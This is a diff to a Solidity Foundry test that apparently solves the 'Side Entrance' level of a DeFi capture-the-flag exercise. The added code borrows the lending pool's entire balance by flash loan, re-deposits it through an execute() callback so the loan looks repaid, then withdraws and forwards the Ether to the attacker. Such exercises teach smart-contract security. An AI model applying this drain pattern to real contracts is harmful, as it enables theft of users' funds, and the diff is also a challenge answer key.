@@ -31,15 +31,20 @@ contract SideEntrance is Test {
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
+    
+    receive() external payable{
+        payable(attacker).call{value:msg.value}("");
+    }
 
+    function execute() external payable{
+        sideEntranceLenderPool.deposit{value:msg.value}();
+    }
+    
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+        // Exploit
+        sideEntranceLenderPool.flashLoan(address(sideEntranceLenderPool).balance);
+        sideEntranceLenderPool.withdraw();
 
-        /**
-         * EXPLOIT END *
-         */
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
